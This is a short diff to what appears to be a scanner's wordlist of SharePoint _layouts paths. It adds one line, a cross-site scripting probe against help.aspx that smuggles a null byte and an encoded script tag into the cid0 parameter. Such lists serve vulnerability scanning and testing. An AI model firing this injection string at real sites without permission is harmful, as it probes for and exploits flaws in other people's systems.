@@ -632,6 +632,7 @@ _layouts/getsspscopes.aspx
 _layouts/getsspstatus.aspx
 _layouts/groups.aspx
 _layouts/help.aspx
+_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X
 _layouts/helpcontent.aspx
 _layouts/helpsearch.aspx
 _layouts/hold.aspx
